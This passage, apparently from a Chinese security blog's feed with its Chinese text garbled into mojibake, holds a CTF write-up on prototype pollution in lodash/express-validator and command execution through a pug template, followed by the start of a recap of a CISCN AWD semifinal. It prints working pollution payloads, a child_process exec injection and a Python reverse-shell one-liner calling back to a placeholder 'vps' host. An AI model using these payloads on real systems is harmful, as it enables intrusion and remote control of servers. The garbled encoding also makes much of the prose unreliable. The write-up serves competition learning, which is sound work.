·å°±è¾¾åˆ°äº†æ±¡æŸ“ï¼Œä»è€Œè®©<code>isadmin</code>å˜ä¸ºénotadmin</p><p>å›¾ä¸º <a href="www.mrkaixin.top">@Mrkaixin</a> å¸ˆå‚…ç»™å‡ºçš„sessionæ ·å­</p><img src="/article/2021dfjk/image-20210803144614812.png" class="" title="image-20210803144614812" loading="lazy"><h3 id="ç¬¬ä¸‰æ­¥-åŸå‹é“¾æ±¡æŸ“"><a href="#ç¬¬ä¸‰æ­¥-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ç¬¬ä¸‰æ­¥ - åŸå‹é“¾æ±¡æŸ“"></a>ç¬¬ä¸‰æ­¥ - åŸå‹é“¾æ±¡æŸ“</h3><p>æ ¹æ®è¯»åˆ°çš„packageåŒ…å¼•ç”¨ï¼Œå‘ç°lodashç‰ˆæœ¬ä¸º4.17.15ã€‚lodash&lt;4.17.17æ˜¯æœ‰åŸå‹é“¾æ±¡æŸ“æ¼æ´çš„</p><img src="/article/2021dfjk/E34B2280959DFF59059010F95FFB5E8C.png" class="" title="E34B2280959DFF59059010F95FFB5E8C" loading="lazy"><p>è¿™é‡Œç»™å‡º<a href="https://paper.seebug.org/1426/">å‚è€ƒæ–‡ç« </a>å¼•ç”¨éƒ¨åˆ†ï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼Œå‚è€ƒæ–‡ç« åœ¨æ–‡æœ«</p><blockquote><p>æµ‹è¯•æ•°æ®åŒ…ï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__[test]"</span><span class="token operator">:</span> <span class="token string">"123 "</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™é‡Œåœ¨segments.reduceå‡½æ•°ä¸­å¯¹è¾“å…¥çš„å€¼è¿›è¡Œäº†ä¸€äº›åˆ¤æ–­å’Œæ›¿æ¢ã€‚é‡è¦çš„ç‚¹å°±æ˜¯å½“ä¼ å…¥çš„é”®ä¸­å­˜åœ¨<code>.</code> ï¼Œåˆ™ä¼šåœ¨å­—ç¬¦ä¸¤è¾¹åŠ ä¸Š<code>[&quot; &quot;]</code>ï¼Œå¹¶ä¸”æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç»“æœã€‚</p><p>æ¥ç€ä¹‹å‰çš„è¿‡ç¨‹ï¼Œåœ¨ç»è¿‡äº†è¿‡æ»¤å™¨çš„å¤„ç†ä¹‹åï¼Œä¼šé€šè¿‡lodash.setå¯¹æŒ‡å®šçš„pathè®¾ç½®æ–°å€¼</p><img src="/article/2021dfjk/1607915420000-16044095450346.jpg-w331s" class="" title="-w1160" loading="lazy"><p>å°è¯•æ±¡æŸ“<strong>proto</strong>[test]ï¼Œç»“æœå‘ç°æ˜¯æ±¡æŸ“å¹¶æ²¡æœ‰æˆåŠŸï¼ŒåŸå› æ˜¯å› ä¸ºï¼Œå½“lodash.setä¸­ç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨ä¸€ä¸ªä¸ç¬¬äºŒä¸ªå‚æ•°åŒåçš„é”®æ—¶ï¼Œæ±¡æŸ“å°±ä¼šå¤±è´¥</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±è¦å°è¯•å»ç»•è¿‡è¿™ä¸ªç‚¹ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¯­å¥ï¼š</p><pre class="language-none"><code class="language-none">path !&#x3D;&#x3D; &#39;&#39; ? _.set(req[location], path, newValue) : _.set(req, location, newValue);</code></pre><p>è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»è¯·æ±‚ä¸­ç›´æ¥å–å‡ºæ¥çš„ï¼Œpathæ˜¯ç»è¿‡å…ˆå‰å¤„ç†åçš„å‡ºæ¥çš„å€¼ã€‚æ‰€ä»¥èƒ½ä¸èƒ½é€šè¿‡è¿™ä¸ªå¤„ç†æ¥è¿›è¡Œç»•è¿‡å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚ å½“æˆ‘ä»¬ä¼ å…¥ï¼š</p><pre class="language-none"><code class="language-none">&#123;&quot;\&quot;].__proto__[\&quot;test&quot;:&quot;123 &quot;&#125;</code></pre><p>è¿™é‡Œçš„é”®ä¸º<code>&quot;].__proto__[&quot;test</code>ï¼Œç”±äºå­—ç¬¦é‡Œé¢å­˜åœ¨<code>.</code>ï¼Œæ‰€ä»¥åœ¨segments.reduceå‡½æ•°å¤„ç†æ—¶ä¼šå¯¹å…¶å·¦å³åŠ åŒå¼•å·å’Œä¸­æ‹¬å·ï¼Œæœ€ç»ˆå˜æˆï¼š<code>[&quot;&quot;].__proto__[&quot;test&quot;]</code>ã€‚</p><p>è¿™æ—¶å°±ä¸å­˜åœ¨åŒåçš„é”®äº†ï¼Œäºæ˜¯æŸ¥çœ‹æ±¡æŸ“çš„åçš„å€¼å‘ç°ï¼š</p><img src="/article/2021dfjk/1607915421000-16044107085533.jpg-w331s" class="" title="-w426" loading="lazy"><p>æˆ‘ä»¬è®¾ç½®çš„å€¼å¹¶æ²¡æœ‰ä¼ é€’è¿›å»ï¼Œè€Œæ˜¯æ±¡æŸ“ä¸ºäº†ä¸€ä¸ªç©ºå€¼ã€‚ä¸ºä»€ä¹ˆä¼ é€’è¿›æ¥çš„newValueä¸ºç©ºå€¼å‘¢ï¼Ÿ</p><p>ä»select-fields.jsä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯å› ä¸ºå–å€¼æ—¶ï¼Œä½¿ç”¨çš„æ˜¯lodash.getæ–¹æ³•ä»<code>req[&#39;body&#39;]</code>ä¸­å–è¢«å¤„ç†åçš„é”®å€¼ï¼Œå¤„ç†åçš„é”®æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥å–å‡ºæ¥çš„å€¼å°±ä¸ºundefinedã€‚å½“undefinedä¼ é€’åˆ°Sanitization.runæ–¹æ³•ä¸­åï¼Œç»è¿‡äº†ä¸€ä¸ª<code>.toString()</code>çš„å¤„ç†å˜æˆäº†<code>&#39;&#39;</code>ç©ºå­—ç¬¦ä¸²ã€‚</p><p>åˆ©ç”¨lodash.getæ–¹æ³•ä¸­è¯»å–é”®å€¼çš„å¦™ç”¨å¾—åˆ°æœ€ç»ˆçš„payloadï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"testvalue"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token property">"a\"].__proto__[\"test"</span><span class="token operator">:</span> <span class="token number">222</span><span class="token punctuation">&#125;</span></code></pre><p>è¯¦ç»†å¯åœ¨å‚è€ƒæ–‡ç« ä¸­æŸ¥çœ‹</p></blockquote><p>äºæ˜¯è¿›è¡Œæµ‹è¯•</p><p>æµ‹è¯•ä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">9001</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    extended<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>    body<span class="token punctuation">,</span>    validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span>middlewares <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>middlewares<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token string">"hellowrold"</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>    <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">server listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>lod <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span>lod<span class="token punctuation">.</span><span class="token function">setWith</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"__proto__[isadmin]"</span><span class="token punctuation">,</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span></code></pre><p>æ ¹æ®åŸpayloadï¼Œå¯ä»¥å‘ç°ï¼Œè¿™é‡Œç”¨jsonæ ¼å¼postçš„è¯·æ±‚æˆåŠŸè¾¾åˆ°äº†ç›®çš„ï¼Œå¹¶ä¸”è¿˜èƒ½è¿›è¡Œè¦†ç›–</p><img src="/article/2021dfjk/image-20210803151756631.png" class="" title="image-20210803151756631" loading="lazy"><p>ä½†æ˜¯é—®é¢˜åœ¨äºé¢˜ç›®æ˜¯ä¸è§£æjsonè¯·æ±‚çš„ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼æ„é€ åŸå‹é“¾æ±¡æŸ“</p><img src="/article/2021dfjk/image-20210803152057397.png" class="" title="image-20210803152057397" loading="lazy"><p>åæ€ï¼šæ¯”èµ›ä¸­ç”±äºæœªä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¯¼è‡´ä»¥ä¸ºå¿…é¡»è¦è¦†ç›–ä¸ºadminæ‰è¡Œï¼Œé”™å¤±äº†å¤§é‡æ—¶é—´ï¼Œå…¶å®åªè¦æ˜¯énotadminå°±è¡Œ</p><p>æœ€ç»ˆæµ‹è¯•å¦‚ä¸‹</p><img src="/article/2021dfjk/image-20210803151332184.png" class="" title="image-20210803151332184" loading="lazy"><p>Payload:<code>&quot;.constructor.prototype[&quot;xxx</code> </p><p>åˆ©ç”¨è¿™æ ·çš„æ„é€ å™¨å»è¾¾åˆ°è¦†ç›–<code>xxx</code>çš„ç›®çš„ï¼Œ<code>.__proto__.</code> è¿™æ ·æ˜¯ä¸è¡Œçš„</p><img src="/article/2021dfjk/image-20210803152912326.png" class="" title="image-20210803152912326" loading="lazy"><p>åŸå‹é“¾æ±¡æŸ“æˆåŠŸ</p><img src="/article/2021dfjk/image-20210803152818280.png" class="" title="image-20210803152818280" loading="lazy"><h3 id="ç¬¬å››æ­¥-å‘½ä»¤æ‰§è¡Œ"><a href="#ç¬¬å››æ­¥-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ç¬¬å››æ­¥ - å‘½ä»¤æ‰§è¡Œ"></a>ç¬¬å››æ­¥ - å‘½ä»¤æ‰§è¡Œ</h3><p>ç»§ç»­çœ‹ä»£ç ï¼Œå‘ç°<code>session.debug</code>åå°†<code>query</code>è¯·æ±‚çš„<code>p</code>èµ‹åˆ°äº†<code>info.pretty</code>é‡Œã€‚</p><img src="/article/2021dfjk/image-20210803153247822.png" class="" title="image-20210803153247822" loading="lazy"><p>åˆ©ç”¨æ–‡ä»¶è¯»å–è¯»åˆ°äº†<code>/app/view/admin.pug</code></p><pre class="language-pug" data-language="pug"><code class="language-pug"><span class="token tag">html</span>  <span class="token tag">head</span>    <span class="token tag">title</span><span class="token punctuation">=</span><span class="token code"> title</span>    <span class="token tag">meta<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">http-equiv</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"Content-Type"</span></span><span class="token punctuation">,</span> <span class="token attr-name">content</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text/html;charset=UTF-8"</span></span><span class="token punctuation">)</span></span></span>  <span class="token tag">body</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">hello</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></span>      <span class="token tag">p</span><span class="token punctuation">=</span><span class="token code"> text</span>      <span class="token tag">div</span> <span class="token plain-text">#&#123;msg&#125;</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>      <span class="token tag">div</span> <span class="token plain-text">ä¸ªæ€§ç­¾åï¼š</span>        <span class="token tag">div</span> <span class="token plain-text">#&#123;diy&#125;</span>        <span class="token tag">div</span> <span class="token plain-text">---#&#123;msg&#125;</span>    <span class="token tag">form<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">action</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">""</span></span><span class="token punctuation">,</span> <span class="token attr-name">method</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"get"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">div</span> <span class="token plain-text">æ›´æ”¹å›¾ç‰‡</span>        <span class="token tag">select<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">name</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"newimg"</span></span><span class="token punctuation">)</span></span></span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/1.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">çº¸é£æœº</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/2.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">äºº</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/3.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">å°ç«è½¦</span>      <span class="token tag">div</span> <span class="token plain-text">ä¸ªæ€§ç­¾å</span>        <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"diy"</span> value<span class="token operator">=</span><span class="token string">"å°Šè´µçš„adminå¯ä»¥åœ¨è¿™æ›´æ”¹ä¸ªæ€§ç­¾å"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"submit"</span></span><span class="token punctuation">)</span></span></span>    <span class="token tag">div</span> <span class="token plain-text">&lt;img src='#&#123;png&#125;'></span>    <span class="token mixin"><span class="token name function">+hello</span><span class="token punctuation">(</span><span class="token string">"å“ˆå–½"</span><span class="token punctuation">)</span></span>    <span class="token mixin"><span class="token name function">+printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre><p>è¿™é‡Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ŒåŸå› åœ¨pugæ¨¡ç‰ˆå¼•æ“çš„ä¸€ä¸ª<a href="https://github.com/pugjs/pug/issues/3312">issue</a>ä¸­æåˆ°çš„</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>p<span class="token operator">=</span><span class="token single-quoted-string string">');process.mainModule.constructor._load('</span>child_process<span class="token single-quoted-string string">').exec('</span>whoami<span class="token single-quoted-string string">');_=('</span></code></pre><p>åæ€ï¼šexecæ˜¯ä¸å›æ˜¾çš„ï¼ä¸€ç›´è®©æˆ‘ä»¥ä¸ºæ˜¯æˆ‘æ‰“çš„æ–¹å¼ä¸å¯¹â€¦</p><p>æ—¢ç„¶æ²¡å›æ˜¾é‚£è¯•ä¸€ä¸‹å‘ç°æ˜¯é€šå¤–ç½‘çš„ï¼Œå°±å¼¹ä¸ªshellå›æ¥ã€‚è¿™ç®—æ˜¯ä¸ªæ³¨å…¥ï¼Œä¸€æ‰“æ•´ä¸ªç•Œé¢å˜å¾—æƒ¨ä¸å¿ç¹</p><img src="/article/2021dfjk/image-20210803153836972.png" class="" title="image-20210803153836972" loading="lazy"><p>æ™®é€šçš„å¼¹shellå‘½ä»¤ä¼¼ä¹å¹¶ä¸ç®¡ç”¨ï¼Œç›´æ¥å¹²å®ƒ ç”¨pythonå‘½ä»¤å¼¹shell</p><img src="/article/2021dfjk/image-20210803153955025.png" class="" title="image-20210803153955025" loading="lazy"><p>payloadï¼š</p><pre class="language-none"><code class="language-none">.&#x2F;?p&#x3D;&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#39;vps\&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&#39;&#x2F;bin&#x2F;bash\&#39;,\&#39;-i\&#39;]);&quot;&#39;);_&#x3D;(&#39;</code></pre><p>æˆåŠŸå¼¹åˆ°shellï¼Œè·å¾—flag</p><img src="/article/2021dfjk/image-20210803154137511.png" class="" title="image-20210803154137511" loading="lazy"><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å·…å³°fwå°±æ˜¯æˆ‘äº†ï¼Œåšé¢˜ç»éªŒè¿˜æ˜¯ä¸è¶³ï¼Œå¯¹äºåŸå‹é“¾æ±¡æŸ“è¿™ä¸€å—çš„çŸ¥è¯†ç»è¿‡è¿™ä¸€æ¬¡æ¯”èµ›çš„æ£€æµ‹å‘ç°è¿˜æ˜¯æœ‰æ‰€æ¬ ç¼ºï¼ŒæŠ“ç´§æ€»ç»“å·©å›ºä¸€ä¸‹jsåŸå‹é“¾æ±¡æŸ“çš„çŸ¥è¯†ç‚¹å§ã€‚</p><hr><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://paper.seebug.org/1426/">Seebug express-validator 6.6.0 åŸå‹é“¾æ±¡æŸ“åˆ†æ</a></p><p><a href="https://github.com/pugjs/pug/issues/3312">pugæ¨¡ç‰ˆå¼•æ“issue</a></p><p><a href="https://www.mrkaixin.top/">@Mrkaixinå¸ˆå‚…</a> éå¸¸æ„Ÿè°¢Mrkaixinå¸ˆå‚…çš„æŒ‡å¯¼</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021ciscnåä¸œåŒ—åŠå†³èµ›</title>
      <link href="article/2021ciscnawd/"/>
      <url>article/2021ciscnawd/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“æ­£å¼çš„å›½èµ›åŠå†³èµ›awdï¼Œå¤ç›˜æ€»ç»“ï¼Œåˆ†æä¸åæ€</p><a id="more"></a><h2 id="é˜Ÿä¼åç§°ï¼šS3C-2021"><a href="#é˜Ÿä¼åç§°ï¼šS3C-2021" class="headerlink" title="é˜Ÿä¼åç§°ï¼šS3C_2021"></a>é˜Ÿä¼åç§°ï¼šS3C_2021</h2><p>ç¬¬31å</p><p>æ­¢æ­¥äºæ­¤ï¼Œè™½ä¸è£è€€ï¼Œä½†ä»…ä»¥æ­¤é­ç­–è‡ªå·±ã€‚ä¸ºè‡ªå·±ï¼Œä¸ºå›¢é˜Ÿï¼Œä¸ºåç»§çš„å­¦å¼Ÿå­¦å¦¹ä»¬è®°å½•ã€‚</p><p>è‡³æš—æ—¶åˆ»ï¼Œè™½ä¸æ„¿æ‰¿è®¤ï¼Œæœ¬å·¥ä½œå®¤æ‰“å‡ºäº†å†å²è¾‰ç…Œåæœ€å·®çš„ä¸€æ¬¡æˆç»©</p><p>æœ¬äººå¾ˆè‡ªè´£ï¼Œæ²¡èƒ½è·Ÿéšå¸ˆå‚…ä»¬çš„æ­¥ä¼å‰è¿›ï¼Œæ‹–é˜Ÿä¼åè…¿æ­¢æ­¥äºåŠå†³èµ›</p><p>åœ¨æ­¤å¤ç›˜æ€»ç»“</p><hr><h2 id="æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥-9-00-18-30"><a href="#æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥-9-00-18-30" class="headerlink" title="æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥ 9:00-18:30"></a>æ¯”èµ›æ—¶é—´ï¼š2021å¹´6æœˆ19æ—¥ 9:00-18:30</h2><p>æŒ‰ç…§<code>æ—¶é—´ï¼š- äº‹ä»¶</code>æ ¼å¼è¿›è¡Œå®Œæ•´å¤ç›˜ï¼Œä»¥æœ¬äººè§’åº¦å¯¹èµ›å†µè¿›è¡Œåˆ†æ</p><h3 id="æ—¶é—´ï¼šæ¯”èµ›å‰-èµ›å‰å‡†å¤‡"><a href="#æ—¶é—´ï¼šæ¯”èµ›å‰-èµ›å‰å‡†å¤‡" class="headerlink" title="æ—¶é—´ï¼šæ¯”èµ›å‰ - èµ›å‰å‡†å¤‡"></a>æ—¶é—´ï¼šæ¯”èµ›å‰ - èµ›å‰å‡†å¤‡</h3><p>å‡†å¤‡å¥½äº†å®Œå¤‡çš„awdä¸æ­»ç æ‰¹é‡ä¸Šä¼ æ¿€æ´»è„šæœ¬ï¼Œæäº¤flagè„šæœ¬ï¼Œä»¥åŠå„ç±»logæ—¥å¿—åŠåˆ†æå·¥å…·ï¼ŒæŒ‰ç…§å»å¹´æƒ…å†µï¼Œé¢˜ç›®æ˜¯webå¤špwnå°‘ï¼Œå¯¹äºwebåšå¥½äº†å……åˆ†çš„å‡†å¤‡ï¼Œawdå‰æœŸé€Ÿåº¦å–èƒœï¼Œå¦‚æœæœ‰ç®€å•åé—¨å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œè¾¾åˆ°å…¨ç¨‹æ‹¿åˆ†çš„ç›®çš„ã€‚</p><p>æœ¬é˜Ÿä¸‰ä½webå¸ˆå‚…ä¸€ä½pwnå¸ˆå‚…</p><h3 id="æ—¶é—´ï¼šæ¯”èµ›æ—¶-èµ›å†µ"><a href="#æ—¶é—´ï¼šæ¯”èµ›æ—¶-èµ›å†µ" class="headerlink" title="æ—¶é—´ï¼šæ¯”èµ›æ—¶ - èµ›å†µ"></a>æ—¶é—´ï¼šæ¯”èµ›æ—¶ - èµ›å†µ</h3><h4 id="8-30å·¦å³-æœªå¼€èµ›"><a href="#8-30å·¦å³-æœªå¼€èµ›" class="headerlink" title="8:30å·¦å³ - æœªå¼€èµ›"></a>8:30å·¦å³ - æœªå¼€èµ›</h4><p>å‡†å¤‡å¥½è®¾å¤‡ï¼Œæˆ‘å¸¦äº†ä¸¤å°ç”µè„‘ï¼Œä¸€å°ç”µè„‘æ’ä¸Šç½‘çº¿ï¼Œå¼€wifiï¼Œå¦ä¸€å°ç”µè„‘è¿æ¥ã€‚ç”±äºm1çš„armæ¶æ„é—®é¢˜ï¼Œæœ‰äº›äº‹æƒ…ä¸å¾—ä¸åœ¨windowsä¸Šåšï¼Œæ¯”å¦‚Dç›¾æ‰«æä¹‹ç±»çš„ï¼Œä¸ºé˜²æ­¢çº çº·æˆ‘ä¸¤å°ç”µè„‘éƒ½è¿›è¡Œäº†å½•å±ã€‚</p><h4 id="9-00-ç¬¬1è½®"><a href="#9-00-ç¬¬1è½®" class="headerlink" title="9:00 - ç¬¬1è½®"></a>9:00 - ç¬¬1è½®</h4><p>å¼€å§‹æ¯”èµ›ï¼Œé¶æœºå…¨éƒ¨ç”¨sshç§é’¥è¿æ¥ï¼Œä¸å­˜åœ¨ç¯¡æ”¹å¯†ç çš„æƒ…å†µã€‚</p><p>ç¬¬ä¸€æ‰¹2é“webä¸¤é“pwnã€‚ä»¥ipæ ‡å·å‘½åï¼Œ<code>11/12</code> æ˜¯webï¼Œ<code>13/15</code>æ˜¯pwn</p><img 